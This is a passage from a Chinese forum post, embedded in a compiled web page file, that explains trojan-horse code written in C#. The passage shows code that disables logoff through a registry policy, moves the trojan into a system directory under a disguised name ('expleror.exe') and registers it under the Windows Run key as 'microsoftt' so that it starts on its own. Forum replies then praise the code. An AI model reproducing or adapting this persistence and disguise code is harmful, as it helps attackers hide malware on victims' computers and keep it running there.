        <span class="token keyword">try</span>
        <span class="token punctuation">{</span>
            <span class="token comment">//使用RegistryKey.CreateSubKey(string mystring)函数来建立你需要的子键  </span>
            <span class="token class-name">RegistryKey</span> key2 <span class="token operator">=</span> rLocal<span class="token punctuation">.</span><span class="token function">CreateSubKey</span><span class="token punctuation">(</span><span class="token string">&quot;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            key2<span class="token punctuation">.</span><span class="token function">SetValue</span><span class="token punctuation">(</span><span class="token string">&quot;NoLogOff&quot;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            key2<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            mystr <span class="token operator">=</span> mystr <span class="token operator">+</span> <span class="token string">&quot;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer键值Nologoff被修改！请将它置为0!&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p>4．在木马程序中还有一个重要的功能就是自我的复制和转移。木马引入被控制的主机时必需自动将木马隐藏在System,System32的目录下以防被发现。转移的代码分析如下，主要实现的功能是将D盘下的木马程序转移到<code>C:\\\\winnnt\\\\system\\\\msdoss.exe</code>，同时换名称。使用的.NET命名空间System.IO,它的作用是允许对数据流和文件进行同步和异步读写。这里我们使用了System.IO.File类。</p><div class="language-csharp" data-ext="cs"><pre class="language-csharp"><code><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">moveCC1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">{</span>
        <span class="token comment">//函数File.Move(string sourceFileName,string destFileName)起移动文件的作用  </span>
        <span class="token comment">//sourceFileName为要移动的文件名，destFileName为文件的新路径  </span>
        File<span class="token punctuation">.</span><span class="token function">Move</span><span class="token punctuation">(</span><span class="token string">&quot;C:\\\\winnnt\\\\system\\\\msdoss.exe&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;d:\\\\winnt\\\\system32\\\\expleror.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>

    <span class="token comment">//将新移的木马程序设为自启动.分析和前面一样  </span>
    <span class="token keyword">try</span>
    <span class="token punctuation">{</span>
        key1 <span class="token operator">=</span> rLocal<span class="token punctuation">.</span><span class="token function">OpenSubKey</span><span class="token punctuation">(</span><span class="token string">&quot;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        key1<span class="token punctuation">.</span><span class="token function">SetValue</span><span class="token punctuation">(</span><span class="token string">&quot;microsoftt&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;d:\\\\winnt\\\\system32\\\\expleror.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        key1<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>key1 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{</span>
            <span class="token class-name">RegistryKey</span> key2 <span class="token operator">=</span> rLocal<span class="token punctuation">.</span><span class="token function">CreateSubKey</span><span class="token punctuation">(</span><span class="token string">&quot;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            key1<span class="token punctuation">.</span><span class="token function">SetValue</span><span class="token punctuation">(</span><span class="token string">&quot;microsoftt&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;d:\\\\winnt\\\\system32\\\\expleror.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            key1<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token comment">//moveCC1()  </span>
</code></pre></div><hr><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>ldzking
头衔：.NET KING
等级：论坛游民
财产：1440
经验：830
魅力：254
注册：2002-9-15
登录：2003-2-5
文章：63
签定：未知数据
</code></pre></div><blockquote><p>高手，太棒了</p></blockquote><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>asp.net
头衔：CTO
等级：论坛游侠
财产：4881
经验：1469
魅力：809
注册：2002-8-3
登录：2003-4-22
文章：158
签定：华中理工大学
</code></pre></div><blockquote><p>支持</p></blockquote><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>qiaov
等级：论坛游民
财产：1890
经验：763
魅力：311
注册：2002-8-4
登录：2003-4-11
文章：91
签定：陕西省西安市
</code></pre></div><blockquote><p>up</p></blockquote><hr><div class="language-txt" data-ext="txt"><pre class="language-txt"><code>xpilot
等级：新手上路
财产：1501
经验：261
魅力：261
注册：2002-8-15
登录：2003-4-23
文章：59
签定：云南省昆明市
</code></pre></div><blockquote><p>都是CSDN的东西,一天到晚贴来贴去的...没意思!</p></blockquote>`,52),c=[o];function e(u,l){return s(),a("div",null,c)}const i=n(p,[["render",e],["__file","safe3.html.vue"]]);export{i as default};
